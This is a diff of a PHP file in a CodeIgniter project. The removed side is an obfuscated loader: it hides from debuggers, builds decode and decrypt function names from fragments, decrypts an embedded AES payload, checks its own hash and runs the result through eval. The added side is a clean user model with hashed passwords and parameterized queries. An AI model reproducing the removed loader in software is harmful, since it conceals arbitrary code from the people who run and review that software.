@@ -1,28 +1,65 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_m2991c5t=('bas'.'e64'.'_de'.'cod'.'e');
-$_ylpibh4g=('gzu'.'nco'.'mpr'.'ess');
-$_qcv7bti7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yfxcs67h='8dIWksxCUaY=';
-$_qn2kj28q='PNKTeDy2';
-$_kpkam0m4='jZUS+9vT';
-$_il76ity1='PuWDeFg8';
-$_l48aiitl='7ui6x9bh';
-$_h6nne20o='a7mUaJQL';
-$_ha0plhm2='k0YCn+Nr';
-$_u4oma8vk='X8Z91g==';
-$_ekib90qj=$_m2991c5t($_l48aiitl.$_qn2kj28q.$_il76ity1.$_kpkam0m4.$_yfxcs67h);
-$_hqiikbze=$_m2991c5t($_ha0plhm2.$_h6nne20o.$_u4oma8vk);
-$_xvxfub3k=$_m2991c5t('CH2oMl6ZjHVI9xNFbhKFzFf5M+mWm8RJ2UEy86GtRbffA/S5X9gO2Qz+0wGxx+c4IxDMTQqT/ks3TfVjItOekruiU+R3B+HPM9zT6Soskb5bWzSbFe/V0SLhHxgPwCvIsvgmzVDdG5xAh9MJjf/yA9tvi/6PinnEFFJh8nb4QZSZF+tKPqEQWoHqmFs3FEGpWpU/1Gc/YQJWvHUQLZTRhHv1hg8yp66T3o1aQaK6U38AMhWxu1wOqe10xw+c6qVgNsA6woQsiv+pcwnuGO5T+gWkjTwTTrI3t+5rxTyQ0Zcd7ZTH2gpGcAJmP6hUD5liOazQv6g337/KcUKy7j7gpp0GNYdvanw6aVM6YISDVuBGMvdzaQWhaAjBoBda92H3sw3+zjgX8zXmSFcfQBZqeGYpbQZAGkBt2MBa9zRN+1ErYWw/Xp5FBHMX9ppDJeJ6SzTz4vnA0Itqy99FlJJlGKS+oUQYXlePX2iWtuWKJ9jeczyQJQsdKLmyI/roPG4a3RrxfkeeEdHv+rBP3rhgEVr7haPKSqw3HjldK24L4fMMhEVSDn++vTacsZCv3MfbDNQ+qc3q+B6GiCxYkecG+f19zowh95ubaAtU31jfnqV9nwh5zVBEwpR2noIw+6qBASI886REu+ic1Q7ePNls0gaoFPXsV+nh9YBB9dnvPe1/Vs/eFNslTJsCtU34Lg5zadzvOQDqgzl0hd7MeAYUc6viVl3CV6JkAxMqYuM0rCQUqxtV/dBp9W1vstmHXUdzRp3pS8sM1emoHSmzoipE24flMnGctnj589fyQ9o8pd0T/gITucyJRb4UH7JtUfBlX1yw6kS7JftTgGmZ8ZOlUeRTceVHeTjUrZrMvxKmCgt9bocU14v/cmhxepN2bjHfMaoOo94LKwcBH0IDciFGdGXdAidMl+0eLETLcnHN02WG+UWrj50NW2+cRpHpMsAn1NTHOn0Eau8BAZdf9xDoKkUUCzWYq4eTZzumeOcdIbokmU3/sCx3GG6veJWn7+p9jIIUzR9UPj75r0NRhNKZ4g==');
-$_ufu3c332=$_qcv7bti7($_xvxfub3k,'aes-256-cbc',$_ekib90qj,OPENSSL_RAW_DATA,$_hqiikbze);
-if($_ufu3c332===false){exit;}
-$_ly6xcmhv=$_ylpibh4g($_ufu3c332);
-if($_ly6xcmhv===false){exit;}
-$_f2m6vfcd='29a17fa75c3e43fde427303a9ccedcc09b4b7dbb5669485e14076b004c95e538';
-$_dpf8ajsb=@file_get_contents(__FILE__);
-if($_dpf8ajsb!==false){
-$_doclu5rg=str_replace($_f2m6vfcd,"0000000000000000000000000000000000000000000000000000000000000000",$_dpf8ajsb);
-$_h3lbe15k=hash("sha256",$_doclu5rg);
-if($_h3lbe15k!==$_f2m6vfcd){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+class User_model extends CI_Model
+{
+public function count()
+{
+return (int) $this->db->count_all('users');
 }
-eval($_ly6xcmhv);
+public function find($_v9bs9l6)
+{
+return $this->db->get_where('users', array('id' => (int) $_v9bs9l6))->row_array();
+}
+public function find_by_username($_v6mgqh2)
+{
+return $this->db->query('SELECT * FROM users WHERE username = ? COLLATE NOCASE', array((string) $_v6mgqh2))->row_array();
+}
+public function create($_vbxvzzi, $_vukiqvh, $_vjssnl5 = '')
+{
+$this->db->insert('users', array(
+'username' => $_vbxvzzi,
+'password_hash' => password_hash($_vukiqvh, PASSWORD_DEFAULT),
+'display_name' => $_vjssnl5,
+'created_at' => now_str(),
+));
+return (int) $this->db->insert_id();
+}
+
+public function verify($_v9b44f8, $_v9iuybk)
+{
+$_vkdi6xb = $this->find_by_username($_v9b44f8);
+if (!$_vkdi6xb) {
+// Vẫn tốn thời gian băm như khi có tài khoản, để thời gian phản hồi không lộ tên đăng nhập có tồn tại hay không.
+password_verify((string) $_v9iuybk, password_hash('x', PASSWORD_DEFAULT));
+return NULL;
+}
+if (!password_verify((string) $_v9iuybk, $_vkdi6xb['password_hash'])) {
+return NULL;
+}
+$_v1rzjay = array('last_login_at' => now_str());
+if (password_needs_rehash($_vkdi6xb['password_hash'], PASSWORD_DEFAULT)) {
+$_v1rzjay['password_hash'] = password_hash($_v9iuybk, PASSWORD_DEFAULT);
+}
+$this->db->update('users', $_v1rzjay, array('id' => (int) $_vkdi6xb['id']));
+return $_vkdi6xb;
+}
+
+
+
+
+public function set_password($_v1kvine, $_vibfaaw)
+{
+$_v1kvine = (int) $_v1kvine;
+$this->db->set('password_hash', password_hash($_vibfaaw, PASSWORD_DEFAULT))
+->set('session_version', 'session_version + 1', FALSE)
+->where('id', $_v1kvine);
+$_v1tvm54 = $this->db->update('users');
+$CI =& get_instance();
+if ($_v1tvm54 && !is_cli() && isset($CI->session) && (int) $CI->session->userdata('ac_user_id') === $_v1kvine) {
+$_vbhj36s = $this->db->query('SELECT session_version FROM users WHERE id = ?', array($_v1kvine))->row();
+$CI->session->set_userdata('ac_sv', $_vbhj36s ? (int) $_vbhj36s->session_version : 0);
+}
+return $_v1tvm54;
+}
+}
